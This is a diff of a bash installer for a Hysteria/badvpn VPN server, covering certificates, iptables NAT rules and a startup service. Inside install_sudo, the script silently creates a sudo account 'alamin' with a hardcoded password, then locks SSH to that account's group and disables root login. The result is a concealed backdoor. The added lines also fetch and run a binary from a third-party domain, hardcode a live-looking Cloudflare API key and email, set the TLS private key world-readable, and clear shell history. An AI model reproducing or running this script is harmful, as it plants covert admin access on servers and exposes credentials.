@@ -1,12 +1,9 @@
 #!/bin/bash
 #Script Variables
-HOST='139.162.143.214';
-USER='candyvip_worldpl';
-PASS='candyvip_worldpl';
-DBNAME='candyvip_worldpl';
-PORT_TCP='5666';
-PORT_UDP='5666';
-SUB_DOMAIN=stu1.worldplush.xyz
+DOMAIN=admin-boyes.com
+CF_ID=ericlaylay@gmail.com
+CF_KEY=267f2cf11375260fa526109dcb9c630697815
+CF_ZONE=ed5388f45740be5403f682843198efcd
 MYIP=$(wget -qO- icanhazip.com);
 server_ip=$(curl -s https://api.ipify.org)
 timedatectl set-timezone Asia/Riyadh
@@ -63,7 +60,55 @@ echo '{
 chmod 755 /etc/hysteria/config.json
 chmod 755 /etc/hysteria/hysteria.crt
 chmod 755 /etc/hysteria/hysteria.key
+
+wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 }
+}
+
+
+install_firewall_kvm () {
+clear
+echo "Installing iptables."
+echo "net.ipv4.ip_forward=1
+net.ipv4.conf.all.rp_filter=0
+net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
+sysctl -p
+{
+iptables -F
+iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
+iptables-save > /etc/iptables_rules.v4
+ip6tables-save > /etc/iptables_rules.v6
+}
+}
+
+install_rclocal(){
+  {  
+  
+    echo "[Unit]
+Description=tknetwork service
+Documentation=http://teamkidlat.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/tknetwork.service
+    echo '#!/bin/sh -e
+iptables-restore < /etc/iptables_rules.v4
+ip6tables-restore < /etc/iptables_rules.v6
+sysctl -p
+service hysteria-server restart
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
+exit 0' >> /etc/rc.local
+    sudo chmod +x /etc/rc.local
+    systemctl daemon-reload
+    sudo systemctl enable tknetwork
+    sudo systemctl start tknetwork.service
+  }
 }
 
 
@@ -139,6 +184,7 @@ bJlsQ2uRl9EMC5MCHdK8aXdJ5htN978UeAOwproLtOGFfy/cQjutdAFI3tZs4RmY
 CV4Ks2dH/hzg1cEo70qLRDEmBDeNiXQ2Lu+lIg+DdEmSx/cQwgwp+7e9un/jX9Wf
 8qn0dNW44bOwgeThpWOjzOoEeJBuv/c=
 -----END CERTIFICATE-----
+
 EOF
     
 cat << EOF > /etc/hysteria/hysteria.key
@@ -160,7 +206,7 @@ echo "Installing letsencrypt."
 {
 domain=$(cat /root/domain)
 curl  https://get.acme.sh | sh
-~/.acme.sh/acme.sh --register-account -m support@fibervpn.live --server zerossl
+~/.acme.sh/acme.sh --register-account -m ericlaylay@gmail.com --server zerossl
 ~/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
 ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/hysteria/hysteria.crt --keypath /etc/hysteria/hysteria.key --ecc
 }
@@ -182,21 +228,6 @@ echo "$SUB_DOMAIN" > /root/domain
 }
 
 
-
-install_firewall_kvm () {
-clear
-echo "Installing iptables."
-echo "net.ipv4.ip_forward=1
-net.ipv4.conf.all.rp_filter=0
-net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
-sysctl -p
-{
-iptables -F
-iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
-iptables-save > /etc/iptables_rules.v4
-ip6tables-save > /etc/iptables_rules.v6
-}
-}
 
 
 
@@ -239,36 +270,13 @@ cd /etc || exit
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@Alaminbdsc17@ | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@AlaminX001 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
-install_rclocal(){
-  {  
-  
-    echo "[Unit]
-Description=teamkidlat service
-Documentation=http://teamkidlat.com
-[Service]
-Type=oneshot
-ExecStart=/bin/bash /etc/rc.local
-RemainAfterExit=yes
-[Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/teamkidlat.service
-    echo '#!/bin/sh -e
-iptables-restore < /etc/iptables_rules.v4
-ip6tables-restore < /etc/iptables_rules.v6
-sysctl -p
-service hysteria-server restart
-exit 0' >> /etc/rc.local
-    sudo chmod +x /etc/rc.local
-    systemctl daemon-reload
-    sudo systemctl enable teamkidlat
-    sudo systemctl start teamkidlat.service
-  }
-}
+
 
 start_service () {
 clear
@@ -282,6 +290,9 @@ echo -e "[IP] : $server_ip\n[Hysteria Port] : 5666\n"
 history -c;
 systemctl start hysteria-server.service
 systemctl enable hysteria-server.service
+wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 sleep 20
 reboot
 }
